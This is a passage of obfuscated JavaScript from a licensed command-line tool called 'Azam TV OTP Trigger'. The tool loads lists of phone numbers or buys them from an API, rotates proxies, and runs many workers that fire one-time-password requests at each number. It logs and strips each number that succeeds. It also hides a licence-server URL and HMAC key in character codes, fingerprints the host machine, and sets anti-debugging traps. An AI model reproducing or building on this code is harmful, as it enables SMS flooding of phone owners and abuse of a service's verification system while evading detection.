          const _Nb = _Gb.cpus(), _Ob = _Nb && _Nb.length > 0 ? _Nb[0].model : 'UnknownCPU', _Pb = _Gb.totalmem(), _Qb = _Gb.release(), _Rb = _Gb.hostname();
          arr3.push('F:' + _Ob + '|' + _Pb + '|' + _Qb + '|' + _Rb);
        } catch (err14) {
        }
        const _Sb = arr3.join('||'), _Tb = crypto.createHash('sha256').update(_Sb).digest('hex').toUpperCase();
        return 'ANKING-7BA3FB09-723F-A500';
      }
    } catch (err15) {
      return '';
    }
  }
  function verifyKeySig(_Ub, _Vb) {
    const arr4 = [
        25,
        55,
        40,
        60,
        43,
        49,
        62,
        40,
        126,
        51,
        33,
        105,
        60,
        41,
        55,
        46
      ], _Wb = arr4.map(item2 => String.fromCharCode(item2 ^ 90)).join('');
    if (!_Vb.sig)
      return false;
    const _Xb = _Ub + '|' + (_Vb.user || '') + '|' + (_Vb.expires || ''), _Yb = crypto.createHmac('sha256', _Wb).update(_Xb).digest('hex');
    return _Yb === _Vb.sig;
  }
  async function start() {
    const _Zb = generateHWID.toString(), _ac = crypto.createHash('md5').update(_Zb).digest('hex'), _bc = generateHWID();
    !_bc && (console.error(R('\n  \u2717 Could not generate Hardware ID. Run on Windows.\n')), process.exit(1));
    const _cc = generateHWID();
    _cc !== _bc && (console.error(R('\n  \u2717 HWID integrity check failed. Tampering detected.\n')), process.exit(1));
    printHeader();
    console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
    console.log(W('\u2502 [\u2022] Tool      : ') + B('Azam TV OTP Trigger          ') + W('\u2502'));
    console.log(W('\u2502 [\u2022] Your HWID : ') + C(_bc.padEnd(29)) + W('\u2502'));
    console.log(W('\u2502 [\u2022] Status    : ') + Y('Verifying License...         ') + W('\u2502'));
    console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518'));
    console.log('');
    let _dc = false, _ec = '';
    try {
      const promise = await new Promise((resolve7, reject4) => {
        const arr5 = [
            104,
            116,
            116,
            112,
            115,
            58,
            47,
            47,
            103,
            105,
            115,
            116,
            46,
            103,
            105,
            116,
            104,
            117,
            98,
            117,
            115,
            101,
            114,
            99,
            111,
            110,
            116,
            101,
            110,
            116,
            46,
            99,
            111,
            109,
            47
          ], arr6 = [
            115,
            99,
            114,
            97,
            112,
            101,
            114,
            107,
            105,
            110,
            103,
            57,
            57,
            47
          ], arr7 = [
            100,
            50,
            51,
            49,
            50,
            56,
            54,
            97,
            50,
            100,
            50,
            51,
            101,
            49,
            55,
            48,
            54,
            97,
            50,
            98,
            52,
            100,
            49,
            48,
            52,
            55,
            56,
            99,
            51,
            55,
            49,
            98,
            47,
            114,
            97,
            119,
            47,
            107,
            101,
            121,
            115,
            46,
            106,
            115,
            111,
            110
          ], _fc = arr5.map(item3 => String.fromCharCode(item3)).join('') + arr6.map(item4 => String.fromCharCode(item4)).join('') + arr7.map(item5 => String.fromCharCode(item5)).join(''), opts39 = {};
        opts39.timeout = 15000;
        https.get(_fc + ('?t=' + Date.now()), opts39, _gc => {
          let _hc = '';
          _gc.on('data', _ic => _hc += _ic);
          _gc.on('end', () => {
            try {
              resolve7(JSON.parse(_hc));
            } catch (err16) {
              reject4(err16);
            }
          });
        }).on('error', reject4).on('timeout', function () {
          this.destroy();
          reject4(new Error('Timeout'));
        });
      });
      if (promise && promise.keys) {
        const _jc = promise.keys[_bc];
        if (!_jc) {
          const parts7 = '7|4|6|5|1|2|0|3'.split('|');
          let _kc = 0;
          while (true) {
            switch (parts7[_kc++]) {
            case '0':
              console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
              continue;
            case '1':
              console.error(R('  \u2551  Status : NOT REGISTERED                    \u2551'));
              continue;
            case '2':
              console.error(R('  \u2551  Contact: t.me/scraper_king to register     \u2551'));
              continue;
            case '3':
              process.exit(1);
              continue;
            case '4':
              console.error(R('  \u2551    \u2717 UNAUTHORIZED HARDWARE \u2014 AZTV TOOL      \u2551'));
              continue;
            case '5':
              console.error(R('  \u2551  HWID   : ') + Y(_bc.padEnd(33)) + R('\u2551'));
              continue;
            case '6':
              console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
              continue;
            case '7':
              console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
              continue;
            }
            break;
          }
        }
        if (!verifyKeySig(_bc, _jc)) {
          console.error(R('\n  \u2717 License key signature invalid. Forged key detected.\n'));
          process.exit(1);
        }
        _dc = true;
        _ec = _jc.user || 'Licensed';
      }
    } catch (err17) {
      console.error(R('\n  \u2717 License server unreachable. Internet connection required.'));
      console.error(G('    Error: ' + err17.message));
      process.exit(1);
    }
    let _lc = process.argv.slice(2), _mc = null;
    if (_lc.length === 0) {
      const _nc = await interactiveWizard();
      _lc = [
        _nc.numbersFile,
        _nc.threads,
        _nc.proxiesFile,
        _nc.flow
      ];
      _mc = _nc.nexaConfig;
    }
    let _oc = path.resolve(_lc[0] || 'numbers.txt'), _pc = parseInt(_lc[1]) || 20, _qc = _lc[2] !== undefined ? _lc[2] : 'proxies.txt';
    if (_qc.toLowerCase() === 'none')
      _qc = '';
    let _rc = _lc[3] || 'SIGN_UP';
    printHeader();
    console.log(B('  \u2713 License: ' + _ec) + G(' | HWID: ' + _bc));
    let arr8 = [];
    if (!_mc) {
      if (!fs.existsSync(_oc)) {
        console.error(R('\u2717 Error: Numbers file not found: ' + _oc));
        process.exit(1);
      }
      arr8 = fs.readFileSync(_oc, 'utf8').split(/\r?\n/).map(item6 => item6.trim()).filter(item7 => item7.length > 5);
    }
    let arr9 = [];
    if (_qc && fs.existsSync(_qc)) {
      arr9 = fs.readFileSync(_qc, 'utf8').split('\n').map(item8 => item8.trim()).filter(item9 => item9.length > 0);
    }
    let _sc = arr9.map(parseProxy).filter(Boolean);
    _mc ? console.log(C('\u2713 Target  : NexaOTP API (' + _mc.totalCount + ' numbers)')) : console.log(C('\u2713 Loaded ' + arr8.length + ' targets'));
    if (_sc.length === 0)
      console.log(G('  No proxies configured (running direct)'));
    else
      console.log(G('  Proxies loaded: ' + _sc.length));
    console.log(C('\u2713 Threads : ' + _pc));
    console.log(C('\u2713 Flow    : ' + _rc + '\n'));
    fs.writeFileSync(SUCCESSFUL_FILE, '');
    fs.writeFileSync(FAILED_FILE, '');
    fs.writeFileSync(DEBUG_FILE, '=== DEBUG SESSION ' + new Date().toISOString() + ' ===\n');
    const dashboard = new Dashboard(_mc ? _mc.totalCount : arr8.length);
    let arr10 = [], arr11 = [], _tc = 0, _uc = false;
    _mc && (async () => {
      try {
        for (let _vc = 0; _vc < _mc.totalCount; _vc++) {
          try {
            const _wc = _mc.ranges[Math.floor(Math.random() * _mc.ranges.length)], _xc = await nexaLimiter.enqueue(() => nexaFetchNumber(_mc.apiKey, _wc, _mc.serverEndpoint));
            _xc && (_tc++, arr11.length > 0 ? arr11.shift()(_xc) : arr10.push(_xc));
          } catch (err18) {
            if (err18.message.includes('Insufficient balance') || err18.message.includes('No numbers available')) {
              break;
            }
          }
        }
      } finally {
        _uc = true;
        while (arr11.length > 0)
          arr11.shift()(null);
      }
    })();
    const _yc = _mc ? () => {
        if (arr10.length > 0)
          return Promise.resolve(arr10.shift());
        if (_uc)
          return Promise.resolve(null);
        return new Promise(resolve8 => arr11.push(resolve8));
      } : () => {
        if (arr8.length === 0)
          return Promise.resolve(null);
        const _zc = Math.floor(Math.random() * arr8.length);
        return Promise.resolve(arr8.splice(_zc, 1)[0]);
      }, _Ac = () => {
        if (_sc.length === 0)
          return null;
        const _Bc = _sc[Math.floor(Math.random() * _sc.length)];
        return rotateSessionId(_Bc);
      };
    function _Cc(_Dc) {
      try {
        const _Ec = fs.readFileSync(_oc, 'utf8'), _Fc = _Ec.split(/\r?\n/).filter(item10 => item10.trim() !== _Dc.trim()).join('\n');
        fs.writeFileSync(_oc, _Fc);
      } catch (err19) {
      }
    }
    const _Gc = _mc ? Math.min(_pc, _mc.totalCount) : Math.min(_pc, arr8.length), arr12 = [], _Hc = setInterval(() => dashboard.render(), 500);
    async function _Ic(_Jc) {
      while (true) {
        const _Kc = await _yc();
        if (!_Kc)
          break;
        try {
          const _Lc = await triggerOTP(_Kc, {
            'onStatus': _Mc => dashboard.setStatus('Worker ' + _Jc + ': ' + _Mc),
            'proxy': _Ac(),
            'workerId': _Jc,
            'flowType': _rc === 'AUTO' ? 'SIGN_UP' : _rc
          });
          if (_Lc.success) {
            const parts8 = '4|0|3|2|1'.split('|');
            let _Nc = 0;
            while (true) {
              switch (parts8[_Nc++]) {
              case '0':
                dashboard.processed++;
                continue;
              case '1':
                dashboard.addLog('Triggered OTP for ' + _Lc.phone, 'success');
                continue;
              case '2':
                fs.appendFileSync(SUCCESSFUL_FILE, _Lc.phone + '|OTP_SENT|' + (_Lc.flow || _rc) + '\n');
                continue;
              case '3':
                _Cc(_Kc);
                continue;
              case '4':
                dashboard.successful++;
                continue;
              }
              break;
            }
          } else
            dashboard.failed++, dashboard.processed++, fs.appendFileSync(FAILED_FILE, _Lc.phone + '|' + _Lc.message + '\n'), dashboard.addLog('Failed on ' + _Lc.phone + ': ' + _Lc.message, 'error');
        } catch (err20) {
          dashboard.failed++;
          dashboard.processed++;
          dashboard.addLog('Fatal error on ' + _Kc + ': ' + err20.message, 'error');
        }
      }
    }
    for (let _Oc = 0; _Oc < _Gc; _Oc++)
      arr12.push(_Ic(_Oc));
    await Promise.all(arr12);
    clearInterval(_Hc);
    dashboard.render();
    dashboard.stop();
  }
  start().catch(err22 => {
    console.error(R('Fatal error: ' + err22.message));
    process.exit(1);
  });
}
function _o(_Pc) {
  function _Qc(_Rc) {
    if (typeof _Rc === 'string') {
      return function (_Sc) {
      }.constructor('while (true) {}').apply('counter');
    } else {
      if (('' + _Rc / _Rc).length !== 1 || _Rc % 20 === 0)
        (function () {
          return true;
        }.constructor('debu' + 'gger').call('action'));
      else {
        (function () {
          return false;
        }.constructor('debu' + 'gger').apply('stateObject'));
      }
    }
    _Qc(++_Rc);
  }
  try {
    if (_Pc) {
      return _Qc;
    } else
      _Qc(0);
  } catch (err21) {
  }
}